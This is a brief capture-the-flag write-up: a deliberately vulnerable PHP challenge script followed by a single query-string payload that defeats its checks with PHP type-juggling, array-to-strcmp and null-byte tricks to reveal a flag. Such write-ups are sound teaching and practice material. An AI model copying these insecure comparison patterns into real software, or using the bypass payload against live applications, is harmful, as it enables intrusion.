# Challenge
```php 
<?php
show_source(__FILE__);
$v1=0;$v2=0;$v3=0;
$a=(array)json_decode(@$_GET['foo']);
if(is_array($a)){
    is_numeric(@$a["bar1"])?die("nope"):NULL;
    if(@$a["bar1"]){
        ($a["bar1"]>2016)?$v1=1:NULL;
    }
    if(is_array(@$a["bar2"])){
        if(count($a["bar2"])!==5 OR !is_array($a["bar2"][0])) die("nope");
        $pos = array_search("nudt", $a["a2"]);
        $pos===false?die("nope"):NULL;
        foreach($a["bar2"] as $key=>$val){
            $val==="nudt"?die("nope"):NULL;
        }
        $v2=1;
    }
}
$c=@$_GET['cat'];
$d=@$_GET['dog'];
if(@$c[1]){
    if(!strcmp($c[1],$d) && $c[1]!==$d){
        eregi("3|1|c",$d.$c[0])?die("nope"):NULL;
        strpos(($c[0].$d), "htctf2016")?$v3=1:NULL;
    }
}
if($v1 && $v2 && $v3){
    include "flag.php";
    echo $flag;
}
?>
```

# Solution
payload：
```
?foo={"bar1":"2017e","bar2":[[],2,3,4,5],"a2":["nudt"]}&cat[0]=ahtctf2016&cat[1][]=&dog=%00
```

# Refference
 + [chybeta: php是最好的语言](https://chybeta.github.io/2017/08/18/XNUCA-2017-Web%E4%B8%93%E9%A2%98%E8%B5%9B%E5%89%8D%E6%8C%87%E5%AF%BC-php%E6%98%AF%E6%9C%80%E5%A5%BD%E7%9A%84%E8%AF%AD%E8%A8%80-writeup/#more)